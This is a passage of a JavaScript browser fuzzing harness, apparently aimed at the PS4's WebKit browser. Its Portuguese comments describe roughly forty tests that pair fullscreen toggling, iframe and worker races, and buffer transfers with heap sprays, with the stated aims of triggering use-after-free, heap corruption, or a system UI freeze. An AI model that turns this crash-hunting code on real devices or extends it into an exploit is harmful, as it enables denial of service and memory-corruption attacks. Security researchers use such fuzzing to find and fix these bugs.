        document.body.appendChild(el);
        reqFS(el);
        document.body.removeChild(el);
        
        // Tenta acessar propriedades de layout do nodo desconectado
        var h = el.offsetHeight;
        log(">> T152: Detached logic check passed.");
    } catch(e) {
        log(">> T152 Logic Error: " + e.message);
    }
}

function runTest153() {
    log("Iniciando T153: Iframe FS Removal Trap...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    
    var f = document.createElement('iframe');
    container.appendChild(f);
    
    f.onload = function() {
        try {
            var d = f.contentDocument;
            var div = d.createElement('div');
            d.body.appendChild(div);
            div.style.background = "blue";
            
            // O Iframe pede tela cheia
            if(div.webkitRequestFullscreen) div.webkitRequestFullscreen();
            
            // O Pai remove o Iframe do DOM imediatamente
            // Isso deixa o gerenciador de janela do kernel com uma referência órfã?
            setTimeout(function() {
                if(container.contains(f)) container.removeChild(f);
                var spray = new Uint32Array(0x1000).fill(0xDEAD);
            }, 10);
        } catch(e) {}
    };
}

function runTest154() {
    log("Iniciando T154: Video Source Swap Panic...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    
    reqFS(v);
    
    var t = setInterval(function() {
        // Troca a fonte do vídeo enquanto está em modo tela cheia
        // Pode causar race condition no decodificador de mídia do Kernel
        v.src = "dummy_video_" + Math.random() + ".mp4";
        
        // Aloca buffers de mídia falsos
        var b = new Uint8Array(1024*1024);
    }, 100);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(v);
        log(">> T154: Video swap finished.");
    }, 3000);
}

function runTest155() {
    log("Iniciando T155: Pseudo-class Layout Thrash...");
    var el = document.createElement('div');
    el.className = "fs-thrash";
    el.style.background = "green";
    document.body.appendChild(el);
    
    var count = 0;
    var t = setInterval(function() {
        reqFS(el);
        // O CSS .fs-thrash muda drasticamente o layout quando :fullscreen ativa
        // Forçamos leitura de layout síncrona para estressar o motor
        var x = el.offsetWidth;
        exitFS();
        var y = el.offsetWidth;
        count++;
        
        if(count > 20) {
            clearInterval(t);
            log(">> T155: Layout thrashing done.");
        }
    }, 100);
}

function runTest156() {
    log("Iniciando T156: FS Z-Index Layer Explosion...");
    var el = document.createElement('div');
    document.body.appendChild(el);
    reqFS(el);
    
    try {
        for(var i=0; i<1000; i++) {
            var d = document.createElement('div');
            d.style.position = "absolute";
            d.style.zIndex = i;
            d.style.left = (i % 100) + "px";
            d.style.top = (i % 100) + "px";
            // Opacidade e transforms forçam criação de camadas de composição na GPU
            d.style.opacity = 0.9;
            d.style.transform = "translateZ(0)";
            d.innerHTML = "L" + i;
            el.appendChild(d);
            
            if(i % 100 === 0) log(".. Layers: " + i);
        }
        
        setTimeout(function() {
            el.innerHTML = ""; // Destruição em massa de camadas
            exitFS();
            log(">> T156: GPU Layers flushed.");
        }, 2000);
    } catch(e) { log(">> T156 GPU Error: " + e.message); }
}

function runTest157() {
    log("Iniciando T157: Popup Blocker UI Lock...");
    var el = document.createElement('div');
    document.body.appendChild(el);
    reqFS(el);
    
    // Tenta abrir popups enquanto entra em tela cheia
    // O PS4 tenta mostrar notificações de "Popup Bloqueado" sobre o overlay de tela cheia
    // Isso pode travar a thread de UI do sistema (VSH)
    var spam = setInterval(function() {
        window.open("about:blank", "_blank");
        var x = new ArrayBuffer(100000); // Pressão de memória simultânea
    }, 50);
    
    setTimeout(function() {
        clearInterval(spam);
        exitFS();
        log(">> T157: Popup spam stopped.");
    }, 2000);
}

function runTest158() {
    log("Iniciando T158: Fullscreen Canvas OOM...");
    var c = document.createElement('canvas');
    // Tamanho massivo para forçar VRAM
    c.width = 3840; // 4K largura
    c.height = 2160; // 4K altura
    document.body.appendChild(c);
    
    var ctx = c.getContext('2d');
    ctx.fillStyle = "red";
    ctx.fillRect(0,0,3840,2160);
    
    reqFS(c);
    
    var t = setInterval(function() {
        // Redesenha o canvas inteiro em cada frame em tela cheia
        var r = Math.floor(Math.random() * 255);
        ctx.fillStyle = "rgb("+r+",0,0)";
        ctx.fillRect(0,0,3840,2160);
        
        // Tenta alocar mais memória gráfica
        var imgData = ctx.getImageData(0,0,100,100);
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        log(">> T158: 4K Buffer stress finished.");
    }, 3000);
}

function runTest159() {
    log("Iniciando T159: Screen Orientation Lock DoS...");
    var el = document.createElement('div');
    document.body.appendChild(el);
    reqFS(el);
    
    // Tenta travar a orientação repetidamente (mesmo que PS4 não suporte rotação física, a API pode existir)
    var t = setInterval(function() {
        if(screen.orientation && screen.orientation.lock) {
            screen.orientation.lock('landscape').catch(e=>{});
            screen.orientation.unlock();
            screen.orientation.lock('portrait').catch(e=>{});
        } else {
            // Fallback: Redimensionar janela
            window.resizeTo(Math.random()*1000, Math.random()*1000);
        }
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        log(">> T159: Orientation lock cycle done.");
    }, 2000);
}

function runTest160() {
    log("Iniciando T160: The Blackout (Ctx Switch)...");
    var el = document.createElement('div');
    el.style.background = "black";
    el.style.width = "100%"; el.style.height = "100%";
    document.body.appendChild(el);
    
    var state = false;
    
    // Alterna rapidamente entre Fullscreen e Normal enquanto aloca memória pesada
    // Objetivo: Falha na troca de contexto gráfico (Context Switch)
    var t = setInterval(function() {
        if(!state) {
            reqFS(el);
            state = true;
        } else {
            exitFS();
            state = false;
        }
        
        // Heap spray sincronizado com a troca de tela
        var arr = new Array(1000);
        for(var i=0; i<arr.length; i++) arr[i] = new Uint8Array(4096).fill(0xCC);
        
    }, 200); // Intervalo um pouco maior para permitir a transição iniciar antes de abortar
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T160: Context switch stress stopped.");
    }, 4000);
}
function runTest161() {
    log("Iniciando T161: Pointer Lock Race Condition...");
    var c = document.createElement('canvas');
    c.style.background = "black";
    document.body.appendChild(c);
    
    reqFS(c);
    
    var t = setInterval(function() {
        try {
            // Tenta travar o ponteiro (mouse) e sair da tela cheia simultaneamente
            // Isso confunde o subsistema de entrada sobre quem tem o foco
            if(c.requestPointerLock) c.requestPointerLock();
            else if(c.webkitRequestPointerLock) c.webkitRequestPointerLock();
            
            setTimeout(function() {
                if(document.pointerLockElement === c) document.exitPointerLock();
                exitFS();
            }, 10);
            
            // Recria o elemento para invalidar handles
            if(Math.random() > 0.9) {
                document.body.removeChild(c);
                c = document.createElement('canvas');
                c.style.background = "red";
                document.body.appendChild(c);
                reqFS(c);
            }
        } catch(e) {}
    }, 100);
    
    setTimeout(function() {
        clearInterval(t);
        if(document.body.contains(c)) document.body.removeChild(c);
        log(">> T161: Input race stopped.");
    }, 3000);
}

function runTest162() {
    log("Iniciando T162: Canvas Context Loss Flood...");
    var c = document.createElement('canvas');
    c.width = 1920; c.height = 1080;
    document.body.appendChild(c);
    var ctx = c.getContext('2d');
    
    reqFS(c);
    
    var t = setInterval(function() {
        // Tenta forçar a perda do contexto gráfico redimensionando massivamente
        // enquanto está em modo exclusivo de vídeo
        c.width = (c.width === 10) ? 4096 : 10;
        c.height = (c.height === 10) ? 4096 : 10;
        
        try {
            // Desenha algo pesado
            ctx.fillStyle = "rgba(255,0,0,0.5)";
            ctx.fillRect(0,0, c.width, c.height);
            
            // Simula evento de perda de contexto (Webkit específico)
            var ext = ctx.getExtension('WEBGL_lose_context');
            if(ext) ext.loseContext();
        } catch(e) {}
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(c);
        log(">> T162: GPU Context stress done.");
    }, 3000);
}

function runTest163() {
    log("Iniciando T163: SVG Filter Stack Overflow...");
    var div = document.createElement('div');
    div.style.width = "100%"; div.style.height = "100%";
    div.style.background = "white";
    div.innerHTML = "TEXT".repeat(100);
    document.body.appendChild(div);
    
    var svg = '<svg><filter id="f"><feGaussianBlur stdDeviation="10" /></filter></svg>';
    var s = document.createElement('div');
    s.innerHTML = svg;
    document.body.appendChild(s);
    
    reqFS(div);
    
    var count = 0;
    var t = setInterval(function() {
        // Empilha filtros recursivamente via CSS string
        var f = "url(#f) ";
        div.style.filter = f.repeat(count % 50);
        
        // Rotaciona para forçar recomposição da camada
        div.style.transform = "rotate(" + count + "deg)";
        count++;
        
        if(count > 200) {
            clearInterval(t);
            exitFS();
            document.body.removeChild(div);
            log(">> T163: SVG Filter stack limit tested.");
        }
    }, 20);
}

function runTest164() {
    log("Iniciando T164: Mix-Blend-Mode Composite Kill...");
    var container = document.createElement('div');
    container.style.background = "linear-gradient(red, blue)";
    document.body.appendChild(container);
    reqFS(container);
    
    var modes = ["multiply", "screen", "overlay", "darken", "lighten", "color-dodge", "color-burn", "hard-light", "soft-light", "difference", "exclusion"];
    var els = [];
    
    var t = setInterval(function() {
        var el = document.createElement('div');
        el.style.position = "absolute";
        el.style.width = Math.random() * 100 + "%";
        el.style.height = Math.random() * 100 + "%";
        el.style.background = "rgb("+Math.random()*255+","+Math.random()*255+","+Math.random()*255+")";
        
        // Troca o modo de mistura a cada frame
        el.style.mixBlendMode = modes[Math.floor(Math.random() * modes.length)];
        container.appendChild(el);
        els.push(el);
        
        if(els.length > 50) container.removeChild(els.shift());
        
        if(Math.random() > 0.95) {
            container.style.display = "none"; // Força flush do compositor
            container.offsetHeight;
            container.style.display = "block";
        }
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(container);
        log(">> T164: Compositor stress finished.");
    }, 3000);
}

function runTest165() {
    log("Iniciando T165: CSS 3D Transform Matrix Bomb...");
    var el = document.createElement('div');
    el.innerHTML = "3D";
    el.style.fontSize = "100px";
    document.body.appendChild(el);
    reqFS(el);
    
    var i = 0;
    var t = setInterval(function() {
        // Gera matrizes de transformação inválidas ou extremas
        // Isso tenta causar erro de cálculo de ponto flutuante na GPU ou driver
        var v = i * 1000;
        try {
            el.style.transform = "matrix3d(" + v + "," + v + "," + v + "," + v + "," + v + "," + v + "," + v + "," + v + "," + v + "," + v + "," + v + "," + v + "," + v + "," + v + "," + v + "," + v + ")";
            el.style.perspective = (i % 100) + "px";
        } catch(e) {}
        i++;
        
        if(i > 100) {
            clearInterval(t);
            exitFS();
            document.body.removeChild(el);
            log(">> T165: Matrix math stress done.");
        }
    }, 20);
}

function runTest166() {
    log("Iniciando T166: Adopt Node Cross-Doc FS...");
    var doc2 = document.implementation.createHTMLDocument("NewDoc");
    var el = document.createElement('div');
    el.style.background = "purple";
    document.body.appendChild(el);
    
    reqFS(el);
    
    setTimeout(function() {
        try {
            // Tenta adotar o elemento que está em Tela Cheia para outro documento
            // Isso viola a invariante de que o elemento FS deve estar no documento ativo
            doc2.adoptNode(el);
            doc2.body.appendChild(el);
            
            // Tenta sair da tela cheia no documento original, que perdeu a referência
            exitFS();
            
            var spray = new ArrayBuffer(1024*1024);
            log(">> T166: Node adoption executed.");
        } catch(e) {
            log(">> T166 Logic: " + e.message);
        }
        if(document.body.contains(el)) document.body.removeChild(el);
    }, 1000);
}

function runTest167() {
    log("Iniciando T167: Video Poster Swap Flicker...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    reqFS(v);
    
    var t = setInterval(function() {
        // A troca rápida da imagem 'poster' força decodificação de imagem em thread separada
        // Enquanto o elemento está sendo renderizado em overlay de vídeo
        var b = new Blob(["junk" + Math.random()], {type: "image/jpeg"});
        var u = URL.createObjectURL(b);
        v.poster = u;
        
        // Força repaint
        v.width = (Math.random() > 0.5) ? 100 : 200;
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(v);
        log(">> T167: Image decoder race stopped.");
    }, 2500);
}

function runTest168() {
    log("Iniciando T168: Iframe Sandbox Flag Mutation...");
    var f = document.createElement('iframe');
    f.sandbox = "allow-same-origin allow-scripts";
    document.body.appendChild(f);
    
    f.onload = function() {
        try {
            var div = f.contentDocument.createElement('div');
            div.style.background = "yellow";
            f.contentDocument.body.appendChild(div);
            
            // Pede FS de dentro do Iframe
            if(div.webkitRequestFullscreen) div.webkitRequestFullscreen();
            
            // Remove a permissão de fullscreen do sandbox enquanto ele está ativo
            setTimeout(function() {
                f.sandbox = "allow-scripts"; // Remove allow-same-origin e fullscreen implicitamente
                // Tenta acessar o objeto window do frame agora restrito
                var w = f.contentWindow;
                var dead = w.document;
            }, 500);
        } catch(e) {}
    };
    f.src = "about:blank";
    
    setTimeout(function() {
        document.body.removeChild(f);
        log(">> T168: Sandbox mutation check.");
    }, 2000);
}

function runTest169() {
    log("Iniciando T169: Animation Frame Recursion...");
    var el = document.createElement('div');
    document.body.appendChild(el);
    reqFS(el);
    
    var running = true;
    var depth = 0;
    
    function loop() {
        if(!running) return;
        depth++;
        // Tenta empilhar chamadas RAF sem retornar ao event loop
        // Browsers limitam isso, mas em FS a prioridade pode mudar
        requestAnimationFrame(function() {
             var x = new Float32Array(1000);
             if(depth % 100 === 0) el.innerHTML = depth;
             loop();
             loop(); // Branching factor 2
        });
    }
    
    loop();
    
    setTimeout(function() {
        running = false;
        exitFS();
        document.body.removeChild(el);
        log(">> T169: RAF loop terminated. Depth reached high.");
    }, 2000);
}

function runTest170() {
    log("Iniciando T170: Multi-Element FS Toggle...");
    var div1 = document.createElement('div'); div1.id="d1"; div1.style.background="red";
    var div2 = document.createElement('div'); div2.id="d2"; div2.style.background="blue";
    document.body.appendChild(div1);
    document.body.appendChild(div2);
    
    var t = setInterval(function() {
        // Tenta pedir FS para elementos alternados rapidamente
        // O Kernel precisa trocar o buffer de overlay constantemente
        reqFS(div1);
        
        setTimeout(function() {
            reqFS(div2); // Pede FS para outro elemento sem sair do primeiro
        }, 50);
        
        setTimeout(function() {
            exitFS();
        }, 100);
        
    }, 200);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(div1);
        document.body.removeChild(div2);
        log(">> T170: Toggle thrashing done.");
    }, 3000);
}
function runTest171() {
    log("Iniciando T171: Video Track Cue Resize Bomb...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    var t = v.addTextTrack("subtitles");
    t.mode = "showing";
    
    reqFS(v);
    
    var count = 0;
    var loop = setInterval(function() {
        // Adiciona centenas de legendas enquanto a tela tenta redimensionar
        // O renderizador de legendas roda em uma camada separada que precisa sincronizar com o FS
        for(var i=0; i<50; i++) {
            var cue = new VTTCue(count, count+1, "BOMB " + "X".repeat(100));
            // Muda posicionamento vertical para forçar recálculo de layout do overlay
            cue.line = i % 100; 
            t.addCue(cue);
        }
        
        // Remove legendas antigas para causar churn de memória
        if(t.cues.length > 500) {
            for(var k=0; k<200; k++) t.removeCue(t.cues[0]);
        }
        
        count++;
        if(count > 100) {
            clearInterval(loop);
            exitFS();
            document.body.removeChild(v);
            log(">> T171: Subtitle layer stress done.");
        }
    }, 50);
}

function runTest172() {
    log("Iniciando T172: Canvas ReadPixels Sync Lock...");
    var c = document.createElement('canvas');
    c.width = 1920; c.height = 1080;
    document.body.appendChild(c);
    var ctx = c.getContext('2d');
    ctx.fillStyle = "blue";
    ctx.fillRect(0,0,1920,1080);
    
    reqFS(c);
    
    var loop = setInterval(function() {
        // Tenta ler a memória da GPU (síncrono e lento) durante a transição de janela
        // Isso tenta travar o driver de vídeo enquanto ele está trocando buffers
        var x = ctx.getImageData(0,0, 500, 500);
        
        // Modifica o canvas imediatamente após ler
        ctx.fillStyle = "rgb(" + Math.random()*255 + ",0,0)";
        ctx.fillRect(0,0,100,100);
        
        // Gera pressão de memória JS
        var junk = new Uint32Array(x.data.buffer);
    }, 30);
    
    setTimeout(function() {
        clearInterval(loop);
        exitFS();
        document.body.removeChild(c);
        log(">> T172: GPU Readback stress finished.");
    }, 3000);
}

function runTest173() {
    log("Iniciando T173: Object Tag Fallback Switch...");
    var obj = document.createElement('object');
    // Tipo inválido força o navegador a tentar carregar plugin e falhar para fallback
    obj.type = "application/x-shockwave-flash"; 
    obj.innerHTML = "<div style='background:red;width:100%;height:100%'>FALLBACK</div>";
    document.body.appendChild(obj);
    
    reqFS(obj);
    
    var loop = setInterval(function() {
        // Troca o tipo do objeto repetidamente
        // Força o navegador a destruir e recriar o contexto de renderização dentro do FS
        obj.type = (Math.random() > 0.5) ? "application/pdf" : "image/png";
        
        // Modifica o conteúdo de fallback
        obj.innerHTML = "<span>" + Math.random() + "</span>";
        
        // Força reflow
        var h = obj.scrollHeight;
    }, 100);
    
    setTimeout(function() {
        clearInterval(loop);
        exitFS();
        document.body.removeChild(obj);
        log(">> T173: Plugin container stress done.");
    }, 3000);
}

function runTest174() {
    log("Iniciando T174: CSS Clip-Path Geometry Trap...");
    var el = document.createElement('div');
    el.style.width = "100%"; el.style.height = "100%";
    el.style.background = "orange";
    document.body.appendChild(el);
    reqFS(el);
    
    var pts = [];
    for(var i=0; i<100; i++) pts.push("50% 50%");
    
    var loop = setInterval(function() {
        // Atualiza geometria complexa de recorte a cada frame
        // Isso é extremamente custoso para a GPU rasterizar em 1080p
        for(var i=0; i<pts.length; i++) {
            pts[i] = (Math.random()*100) + "% " + (Math.random()*100) + "%";
        }
        el.style.clipPath = "polygon(" + pts.join(',') + ")";
        
        // Adiciona transform 3D para complicar a composição
        el.style.transform = "rotateX(" + Math.random()*360 + "deg)";
    }, 40);
    
    setTimeout(function() {
        clearInterval(loop);
        exitFS();
        document.body.removeChild(el);
        log(">> T174: Geometry clipping stress done.");
    }, 3000);
}

function runTest175() {
    log("Iniciando T175: Iframe Recursive FS Request...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    var depth = 0;
    
    function createFrame(parent) {
        depth++;
        if(depth > 10) return;
        
        var f = document.createElement('iframe');
        parent.appendChild(f);
        f.onload = function() {
            try {
                var d = f.contentDocument;
                var div = d.createElement('div');
                div.style.background = "green";
                d.body.appendChild(div);
                
                // Iframe pede FS
                if(div.webkitRequestFullscreen) div.webkitRequestFullscreen();
                
                // Cria recursão
                createFrame(d.body);
            } catch(e) {}
        };
    }
    
    // Inicia a cadeia
    createFrame(container);
    
    setTimeout(function() {
        document.body.removeChild(container);
        exitFS(); // Tenta limpar estado global
        log(">> T175: Recursive frame FS chain stopped.");
    }, 3000);
}

function runTest176() {
    log("Iniciando T176: Deep Clone Node Append Race...");
    var el = document.createElement('div');
    el.id = "fs-root";
    // Cria árvore pesada
    el.innerHTML = "<div><span>Text</span></div>".repeat(1000);
    document.body.appendChild(el);
    
    reqFS(el);
    
    var loop = setInterval(function() {
        // Clona a árvore inteira (operação pesada na memória)
        var clone = el.cloneNode(true);
        
        // Adiciona ao elemento que já está em FS, forçando repaint massivo
        el.appendChild(clone);
        
        // Remove imediatamente para estressar o GC
        setTimeout(function() {
            el.innerHTML = ""; 
        }, 10);
        
        // Aloca array buffer para competir por RAM
        var spray = new ArrayBuffer(1024 * 1024);
    }, 100);
    
    setTimeout(function() {
        clearInterval(loop);
        exitFS();
        document.body.removeChild(el);
        log(">> T176: DOM Tree cloning stress done.");
    }, 3000);
}

function runTest177() {
    log("Iniciando T177: Selection Range Cross-Boundary...");
    var fsDiv = document.createElement('div');
    fsDiv.textContent = "INSIDE ".repeat(500);
    document.body.appendChild(fsDiv);
    
    var outDiv = document.createElement('div');
    outDiv.textContent = "OUTSIDE ".repeat(500);
    document.body.appendChild(outDiv);
    
    var s = window.getSelection();
    
    reqFS(fsDiv);
    
    var loop = setInterval(function() {
        // Cria uma seleção que começa dentro do elemento FS e termina fora dele
        // Quando o navegador isola o elemento FS, a renderização do 'outDiv' muda
        // Isso pode confundir o cálculo de highlight do texto
        var r = document.createRange();
        try {
            r.setStart(fsDiv.firstChild, Math.floor(Math.random() * 100));
            r.setEnd(outDiv.firstChild, Math.floor(Math.random() * 100));
            s.removeAllRanges();
            s.addRange(r);
            
            // Modifica o DOM afetado pela seleção
            fsDiv.style.fontSize = (Math.random() * 20 + 10) + "px";
        } catch(e) {}
    }, 50);
    
    setTimeout(function() {
        clearInterval(loop);
        exitFS();
        document.body.removeChild(fsDiv);
        document.body.removeChild(outDiv);
        log(">> T177: Selection boundary stress done.");
    }, 3000);
}

function runTest178() {
    log("Iniciando T178: Table Border Collapse Recalc...");
    var t = document.createElement('table');
    t.style.borderCollapse = "collapse";
    t.style.width = "100%"; t.style.height = "100%";
    t.style.background = "white";
    document.body.appendChild(t);
    
    // Cria tabela gigante
    for(var r=0; r<50; r++) {
        var row = t.insertRow();
        for(var c=0; c<20; c++) {
            var cell = row.insertCell();
            cell.style.border = "1px solid black";
            cell.textContent = "X";
        }
    }
    
    reqFS(t);
    
    var loop = setInterval(function() {
        // Alterna border-collapse e muda larguras de borda aleatoriamente
        // O algoritmo de colapso de borda é computacionalmente caro (O(n^2) em alguns casos)
        t.style.borderCollapse = (t.style.borderCollapse == "collapse") ? "separate" : "collapse";
        
        var rows = t.rows;
        var rIdx = Math.floor(Math.random() * 50);
        rows[rIdx].cells[0].style.borderWidth = (Math.random() * 10) + "px";
        
        // Força reflow síncrono
        var x = t.offsetWidth;
    }, 50);
    
    setTimeout(function() {
        clearInterval(loop);
        exitFS();
        document.body.removeChild(t);
        log(">> T178: Table layout stress done.");
    }, 3000);
}

function runTest179() {
    log("Iniciando T179: Scroll Into View Interrupt...");
    var container = document.createElement('div');
    container.style.overflow = "hidden";
    container.style.height = "100vh";
    document.body.appendChild(container);
    
    var target = document.createElement('div');
    target.style.marginTop = "5000px"; // Longe da tela
    target.style.width = "100px"; target.style.height = "100px";
    target.style.background = "red";
    container.appendChild(target);
    
    reqFS(container);
    
    var loop = setInterval(function() {
        // Pede para scrolar até o elemento
        target.scrollIntoView({behavior: "smooth"});
        
        // Imediatamente move o elemento para outro lugar do DOM ou muda layout
        // Quebra a animação de scroll suave do compositor
        setTimeout(function() {
            target.style.marginTop = (Math.random() * 5000) + "px";
            container.scrollTop = 0; // Força reset
        }, 10);
        
    }, 100);
    
    setTimeout(function() {
        clearInterval(loop);
        exitFS();
        document.body.removeChild(container);
        log(">> T179: Scroll animation interrupt done.");
    }, 3000);
}

function runTest180() {
    log("Iniciando T180: Display None Layout Flush...");
    var el = document.createElement('div');
    el.style.background = "yellow";
    el.innerHTML = "<div><span>Complex</span></div>".repeat(500);
    document.body.appendChild(el);
    
    reqFS(el);
    
    var loop = setInterval(function() {
        // Esconde o elemento raiz do FS
        // Isso tecnicamente deveria cancelar o FS, mas em alguns motores causa estado inconsistente
        el.style.display = "none";
        
        // Lê propriedade de layout forçando recálculo em elemento invisível
        var h = el.scrollHeight;
        
        // Mostra de novo
        el.style.display = "block";
        
        // Adiciona garbage
        var junk = document.createElement('span');
        el.appendChild(junk);
    }, 50);
    
    setTimeout(function() {
        clearInterval(loop);
        exitFS();
        document.body.removeChild(el);
        log(">> T180: Display toggling stress done.");
    }, 3000);
}
function runTest181() {
    log("Iniciando T181: Fullscreen + History Flood...");
    var el = document.createElement('div');
    el.style.background = "red";
    document.body.appendChild(el);
    
    reqFS(el);
    
    var count = 0;
    var t = setInterval(function() {
        // Combina troca de buffer de vídeo (FS) com serialização de estado (History)
        try {
            var state = { id: count, junk: new Array(1000).join("x") };
            history.pushState(state, "fs"+count, "/?s="+count);
            
            if(count % 10 === 0) {
                // Força atualização da URL bar (que fica oculta em FS)
                location.hash = "#" + Math.random();
            }
            count++;
        } catch(e) {}
        
        if(count > 200) {
            clearInterval(t);
            exitFS();
            document.body.removeChild(el);
            history.pushState(null, null, "/");
            log(">> T181: UI Overlay/History race finished.");
        }
    }, 20);
}

function runTest182() {
    log("Iniciando T182: Worker + MessageChannel Port UAF...");
    var mc = new MessageChannel();
    var port = mc.port1;
    
    var b = new Blob(["self.onmessage=function(e){var p=e.data; p.postMessage('ping'); p.close();}"], {type:'application/javascript'});
    var w = new Worker(URL.createObjectURL(b));
    
    var t = setInterval(function() {
        try {
            // Cria canais descartáveis
            var tempCh = new MessageChannel();
            // Transfere porta para worker
            w.postMessage(tempCh.port2, [tempCh.port2]);
            
            // Tenta fechar o worker enquanto a porta está em trânsito
            if(Math.random() > 0.8) {
                w.terminate();
                w = new Worker(URL.createObjectURL(b)); // Respawn
            }
            
            // Tenta usar a outra ponta localmente
            tempCh.port1.postMessage("test");
        } catch(e) {}
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T182: Port ownership race stopped.");
    }, 3000);
}

function runTest183() {
    log("Iniciando T183: Worker + Buffer Transfer + GC Race...");
    var b = new Blob(["self.onmessage=function(e){var ab=e.data; self.close();}"], {type:'js'});
    var w = new Worker(URL.createObjectURL(b));
    var ab = new ArrayBuffer(1024 * 1024 * 5); // 5MB
    
    try {
        // Transfere propriedade (neutering)
        w.postMessage(ab, [ab]);
        
        // Remove referência local imediatamente
        ab = null;
        
        // Força pressão de memória para disparar GC enquanto o worker processa a mensagem
        var spray = [];
        for(var i=0; i<10000; i++) spray.push({a:1});
        
        // Tenta acessar a memória antiga via DataView fantasma (se sobrar ref)
        // Em JS puro é difícil, mas o objetivo é corromper o heap do allocator
        log(">> T183: Transfer & GC cycle triggered.");
    } catch(e) { log(">> T183 Error: " + e.message); }
}

function runTest184() {
    log("Iniciando T184: Video + Fullscreen + DOM Removal...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    
    reqFS(v);
    
    setTimeout(function() {
        // O elemento está em tela cheia (overlay ativo)
        // Removemos do DOM abruptamente
        if(v.parentNode) v.parentNode.removeChild(v);
        
        // Imediatamente tentamos manipular o elemento 'zumbi'
        v.src = "junk.mp4";
        
        // E chamamos exitFS globalmente, o que força o kernel a restaurar janela
        // de um elemento que não existe mais no documento
        exitFS();
        
        var junk = new Uint32Array(0x1000).fill(0xDEADBEEF);
        log(">> T184: Video surface detach executed.");
    }, 500);
}

function runTest185() {
    log("Iniciando T185: TypedArray + Worker Terminate Race...");
    var code = "self.onmessage = function(e) { var v = new Uint8Array(e.data); while(1) v[0]=1; }";
    var blob = new Blob([code], {type: 'text/javascript'});
    
    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(blob));
        var ab = new ArrayBuffer(1024 * 1024);
        
        w.postMessage(ab, [ab]); // Transfere
        
        // Mata o worker enquanto ele escreve na memória
        // Tenta pegar o ponteiro de memória de volta para userland (UAF)
        w.terminate();
        
        // Tenta realocar no mesmo slot
        var reclaim = new ArrayBuffer(1024 * 1024);
        var view = new Uint8Array(reclaim);
        if(view[0] === 1) log("!! MEMORY LEAK DETECTED !!");
        
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T185: Buffer ownership race stopped.");
    }, 3000);
}

function runTest186() {
    log("Iniciando T186: History + GC + Iframe Nav...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    var huge = { data: new Array(10000).fill("A") };
    
    f.onload = function() {
        try {
            var w = f.contentWindow;
            // Push state grande dentro do iframe
            w.history.pushState(huge, "t", "v");
            
            // Navega iframe para destruir contexto JS
            f.src = "about:blank";
            
            // Tenta forçar GC do objeto de estado antigo
            var spray = new Array(5000).fill(1);
            
            // Volta no histórico (Browser deve deserializar objeto salvo)
            setTimeout(function() { w.history.back(); }, 100);
        } catch(e) {}
    };
    f.src = "about:blank";
    
    setTimeout(function() {
        if(document.body.contains(f)) document.body.removeChild(f);
        log(">> T186: Serialized state restoration test.");
    }, 2000);
}

function runTest187() {
    log("Iniciando T187: Worker + TextEncoder Fragmentation...");
    var code = `
        var enc = new TextEncoder();
        self.onmessage = function(e) {
            // Encode massivo para fragmentar heap da thread
            for(var i=0; i<1000; i++) enc.encode(e.data + i);
            postMessage("done");
        }
    `;
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    var str = "X".repeat(1024 * 10);
    
    var t = setInterval(function() {
        w.postMessage(str);
    }, 10);
    
    w.onmessage = function() {
        // Main thread também aloca para competir por recursos globais
        var x = new ArrayBuffer(1024*100);
    };
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T187: Thread heap fragmentation done.");
    }, 3000);
}

function runTest188() {
    log("Iniciando T188: Canvas Resize + Fullscreen Toggle...");
    var c = document.createElement('canvas');
    document.body.appendChild(c);
    var ctx = c.getContext('2d');
    
    var t = setInterval(function() {
        // Resize do canvas limpa o buffer
        c.width = Math.random() * 2000;
        c.height = Math.random() * 1000;
        
        ctx.fillStyle = "red";
        ctx.fillRect(0,0,c.width, c.height);
        
        // Tenta entrar/sair de FS durante o resize
        if(Math.random() > 0.5) reqFS(c);
        else exitFS();
        
    }, 100);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(c);
        log(">> T188: Graphics pipeline stress done.");
    }, 3000);
}

function runTest189() {
    log("Iniciando T189: Nested Worker + Transfer Chain Kill...");
    // Worker 1 cria Worker 2
    var code2 = "self.onmessage=function(e){var d=e.data; setInterval(()=>{d[0]++;},0);}";
    var blob2 = new Blob([code2], {type:'js'});
    var url2 = URL.createObjectURL(blob2);
    
    var code1 = `
        var w2 = new Worker('${url2}');
        self.onmessage = function(e) {
            // Repassa buffer para worker filho
            w2.postMessage(e.data, [e.data]);
        }
    `;
    var blob1 = new Blob([code1], {type:'js'});
    var w1 = new Worker(URL.createObjectURL(blob1));
    
    var ab = new Uint8Array(1024*1024);
    
    try {
        w1.postMessage(ab.buffer, [ab.buffer]); // Envia para W1 -> W2
        
        setTimeout(function() {
            // Mata W1 (pai). W2 (filho) deve morrer. Buffer deve ser liberado.
            w1.terminate();
            
            // Aloca lixo para sobrescrever a memória do buffer
            var junk = new Uint32Array(1024*1024/4).fill(0xCAFEBABE);
            log(">> T189: Worker chain killed.");
        }, 500);
    } catch(e) { log(">> T189 Error: " + e.message); }
}

function runTest190() {
    log("Iniciando T190: MEDIA + HISTORY + FULLSCREEN COMBO...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    
    // 1. Entra FS
    reqFS(v);
    
    setTimeout(function() {
        // 2. Empurra estado no history referenciando o vídeo (via object URL ou state)
        history.pushState({v: "video_active"}, "fs", "/fs");
        
